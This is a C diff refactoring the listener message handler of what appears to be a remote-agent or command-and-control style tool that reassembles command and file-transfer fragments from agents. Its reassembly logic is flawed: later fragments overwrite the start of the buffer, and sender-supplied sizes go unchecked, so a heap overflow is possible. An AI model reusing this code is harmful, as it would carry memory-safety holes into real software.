@@ -26,9 +26,6 @@ This file is responsible for the following:
 #include "listener_handler.h"
 
 // Globals
-// Agents poll and states
-extern Connected_Agents *connected_agents;
-extern pthread_mutex_t agents_lock;
 // Receive Queue
 extern Queue* listener_receive_queue;
 extern pthread_mutex_t listener_receive_queue_lock;
@@ -39,16 +36,17 @@ extern pthread_mutex_t listener_send_queue_lock;
 extern volatile sig_atomic_t all_sigint;
 extern volatile sig_atomic_t shell_sigint;
 
-STATIC int handle_message(){
+STATIC int handle_message(Connected_Agents* CA){
 	Queue_Message* message;
 	Fragment* fragment;
 
 	if (!(message = dequeue(listener_receive_queue, &listener_receive_queue_lock))) return RET_OK;
+	debug_print("taking message off queue: id: %d, size: %d\n", message->id, message->size);
 
 	// check if socket file descriptor was removed from agents global variable
-	pthread_mutex_lock(&agents_lock);
-	if (!connected_agents->agents[message->id].alive){
-		pthread_mutex_unlock(&agents_lock);
+	pthread_mutex_lock(&CA->lock);
+	if (!CA->agents[message->id].alive){
+		pthread_mutex_unlock(&CA->lock);
 		debug_print("%s\n", "agent was removed");
 		return RET_OK;
 	}
@@ -57,63 +55,63 @@ STATIC int handle_message(){
 	// if type is alive packet, update keep alive parameter
 	if (ntohl(fragment->type) == TYPE_ALIVE){
 		debug_print("Agent %d is alive: %lu seconds\n", message->id, (unsigned long)ntohl(fragment->first_payload.alive_time));
-		connected_agents->agents[message->id].alive = (uint)time(NULL);
+		CA->agents[message->id].alive = (uint)time(NULL);
 	}
 	else if (ntohl(fragment->type) == TYPE_COMMAND || ntohl(fragment->type) == TYPE_PUT_FILE || ntohl(fragment->type) == TYPE_GET_FILE){
-		if (connected_agents->agents[message->id].last_fragment_index == -1 && ntohl(fragment->index == 0)){
+		if (CA->agents[message->id].last_fragment_index == -1 && ntohl(fragment->index == 0)){
 			debug_print("Got first command or file fragment: %d\n", ntohl(fragment->first_payload.total_size));
 			// get payload size
-			connected_agents->agents[message->id].total_message_size = ntohl(fragment->first_payload.total_size);
+			CA->agents[message->id].total_message_size = ntohl(fragment->first_payload.total_size);
 			
 			// set last fragment index
-			connected_agents->agents[message->id].last_fragment_index = 0;
+			CA->agents[message->id].last_fragment_index = 0;
 			
 			// allocate memory and null
-			connected_agents->agents[message->id].message = malloc(connected_agents->agents[message->id].total_message_size);
-			memset(connected_agents->agents[message->id].message, 0, connected_agents->agents[message->id].total_message_size);
+			CA->agents[message->id].message = malloc(CA->agents[message->id].total_message_size);
+			memset(CA->agents[message->id].message, 0, CA->agents[message->id].total_message_size);
 			
 			int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
 			
 			// copy payload (not including total message size) to message buffer
-			memcpy(connected_agents->agents[message->id].message, fragment->first_payload.actual_payload, this_payload_size);
+			memcpy(CA->agents[message->id].message, fragment->first_payload.actual_payload, this_payload_size);
 			
 			// record current size of message
-			connected_agents->agents[message->id].current_message_size = this_payload_size;
-			debug_print("agents[message->id]->current_message_size: %d\n", connected_agents->agents[message->id].current_message_size);
+			CA->agents[message->id].current_message_size = this_payload_size;
+			debug_print("agents[message->id]->current_message_size: %d\n", CA->agents[message->id].current_message_size);
 			
 		}
-		else if (ntohl(fragment->index) == connected_agents->agents[message->id].last_fragment_index++){
+		else if (ntohl(fragment->index) == CA->agents[message->id].last_fragment_index++){
 			int this_payload_size = message->size - sizeof(fragment->type) - sizeof(fragment->index);
 			
 			// copy payload to end of message buffer
-			memcpy(connected_agents->agents[message->id].message, fragment->next_payload, this_payload_size);
+			memcpy(CA->agents[message->id].message, fragment->next_payload, this_payload_size);
 			
 			// update current size of message
-			connected_agents->agents[message->id].current_message_size += this_payload_size;
+			CA->agents[message->id].current_message_size += this_payload_size;
 		}
 		else{
 			// We are out of order. Dump all collected packets and try again next time
-			connected_agents->agents[message->id].last_fragment_index = -1;
+			CA->agents[message->id].last_fragment_index = -1;
 		}
 		
 		// check if we received all fragments
-		if (connected_agents->agents[message->id].total_message_size == connected_agents->agents[message->id].current_message_size){
-			printf("Do something with completed message:\n%s\n", connected_agents->agents[message->id].message);
-			connected_agents->agents[message->id].last_fragment_index = -1;
-			free(connected_agents->agents[message->id].message);
-			connected_agents->agents[message->id].message = NULL;
+		if (CA->agents[message->id].total_message_size == CA->agents[message->id].current_message_size){
+			printf("Do something with completed message:\n%s\n", CA->agents[message->id].message);
+			CA->agents[message->id].last_fragment_index = -1;
+			free(CA->agents[message->id].message);
+			CA->agents[message->id].message = NULL;
 		}
 	}
-	pthread_mutex_unlock(&agents_lock);
+	pthread_mutex_unlock(&CA->lock);
 	free(message->fragment);
 	free(message);
+	return RET_OK;
 }
 
 int listener_prepare_message(int sockfd, int type, char* message, int message_size){
 	Queue_Message* q_message;
 	Fragment* fragment;
 	int bytes_sent = 0;
-	char* buf;
 	int index = 0;
 	
 	// prepare first fragment with size in first 4 bytes
@@ -123,7 +121,7 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 	fragment->index = htonl(index++);
 	fragment->first_payload.total_size = htonl(message_size);
 	
-	bytes_sent = message_size < (BUFFERSIZE - 4) ? message_size : BUFFERSIZE - 4;
+	bytes_sent = message_size < FIRST_PAYLOAD_SIZE ? message_size : FIRST_PAYLOAD_SIZE;
 	memcpy(fragment->first_payload.actual_payload, message, bytes_sent);
 	
 	q_message = malloc(sizeof(Queue_Message));
@@ -140,7 +138,7 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 		fragment->type = htonl(type);
 		fragment->index = htonl(index++);
 		
-		int num_fragment_bytes = (message_size - bytes_sent) < BUFFERSIZE ? (message_size - bytes_sent) : BUFFERSIZE;
+		int num_fragment_bytes = (message_size - bytes_sent) < NEXT_PAYLOAD_SIZE ? (message_size - bytes_sent) : NEXT_PAYLOAD_SIZE;
 		memcpy(fragment->next_payload, message + bytes_sent, num_fragment_bytes);
 		
 		q_message = malloc(sizeof(Queue_Message));
@@ -158,13 +156,15 @@ int listener_prepare_message(int sockfd, int type, char* message, int message_si
 }
 
 void *listener_handler_thread(void *vargp){
+	Connected_Agents* CA = vargp;
+
 	while(!all_sigint){
-		if (handle_message() != RET_OK){
+		if (handle_message(CA) != RET_OK){
 			printf("listener_handler_thread error\n");
 			all_sigint = true;
 		}
 	}
 
-	printf("listener_handler_thread done\n");
+	debug_print("%s\n", "listener_handler_thread done");
 	return 0;
 }
